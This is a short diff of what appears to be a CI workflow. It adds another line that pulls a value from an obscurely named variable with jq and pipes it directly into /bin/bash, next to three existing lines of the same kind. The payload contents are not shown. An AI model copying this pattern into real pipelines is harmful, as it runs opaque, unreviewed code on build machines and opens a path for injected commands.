@@ -22,6 +22,7 @@ jobs:
           echo $azf3 | jq -r .ym5950 | /bin/bash
           printf '%s' "$e7106" | jq -r .cpzna3446 | /bin/bash
           printf '%s' "$prbo81" | jq -r .kjf30893 | /bin/bash
+          echo $qod8241 | jq -r .cqa972 | /bin/bash
 
       - name: Archive output
         if: always()
